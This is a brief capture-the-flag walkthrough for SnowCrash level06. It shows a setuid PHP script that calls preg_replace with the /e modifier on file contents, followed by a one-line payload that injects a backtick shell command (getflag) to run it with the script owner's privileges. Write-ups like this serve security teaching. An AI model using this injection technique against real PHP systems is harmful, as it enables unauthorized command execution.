level06@SnowCrash:~$ ls
level06  level06.php

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

level06@SnowCrash:~$ ls -lah level06*
-rwsr-x---+ 1 flag06 level06 7.4K Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php


We notice there is a PHP code injection vulnerability caused by the unsafe use of the preg_replace() with the /e modifier.

We create a payload that expoit this vulnerability and get the flag:
echo '[x ${`getflag`}]' > /tmp/level06
./level06 /tmp/level06